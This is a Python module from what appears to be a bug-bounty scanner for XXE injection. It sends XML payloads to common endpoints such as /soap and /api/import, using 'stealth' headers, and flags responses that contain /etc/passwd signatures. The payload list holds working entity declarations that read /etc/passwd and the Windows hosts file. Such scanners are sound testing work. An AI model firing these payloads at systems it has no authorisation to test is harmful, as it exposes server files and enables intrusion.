"""
XXE Scanner — XML External Entity injection detection.
Ref: awesome-bugbounty-tools (XXEinjector, dtd-finder, xxeserv).
"""
from .utils import stealth_headers, safe_post
import requests

XXE_PAYLOADS = [
    # Basic file read
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    # Windows file read
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>',
    # Parameter entity
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
    # Billion laughs (detection only — DO NOT send to production)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]><root>&lol;</root>',
]

XXE_ENDPOINTS = [
    "/api/upload", "/api/import", "/api/parse", "/soap", "/xmlrpc.php",
    "/api/xml", "/ws", "/wsdl", "/Service.asmx", "/api/v1/import",
]


def check_xxe(url):
    """Test XML-accepting endpoints for XXE injection."""
    findings = []
    from urllib.parse import urlparse
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    for ep in XXE_ENDPOINTS:
        target = f"{base}{ep}"
        headers = {**stealth_headers(), "Content-Type": "application/xml"}

        for payload in XXE_PAYLOADS[:2]:  # Only test safe payloads
            r = safe_post(target, data=payload, headers=headers, timeout=8)
            if not r:
                continue

            # Check for file content in a non-HTML response. A precise file
            # signature is stronger than a generic 200 or XML content-type.
            signature = next((value for value in ("root:x:0:0:", "daemon:x:1:") if value in r.text), None)
            content_type = r.headers.get("Content-Type", "").lower()
            if (r.status_code == 200 and signature
                    and "text/html" not in content_type
                    and not r.text.lstrip().lower().startswith("<html")):
                findings.append({
                    "type": "XXE_FILE_READ",
                    "url": target,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "verified": True,
                    "verification_method": "xxe-file-signature",
                    "verification_evidence": {
                        "deterministic": True,
                        "signature": signature,
                        "status": r.status_code,
                        "content_type": content_type,
                    },
                    "detail": "Local file signature returned from an XML request via XXE.",
                })
                return findings

            if "localhost" in r.text and r.status_code == 200:
                # Check if endpoint accepts XML
                if "xml" in r.headers.get("Content-Type", "").lower():
                    findings.append({
                        "type": "XXE_ENDPOINT_FOUND",
                        "url": target,
                        "severity": "LOW",
                        "confidence": "MEDIUM",
                        "detail": "XML-accepting endpoint found (potential XXE target)"
                    })

    return findings if findings else None
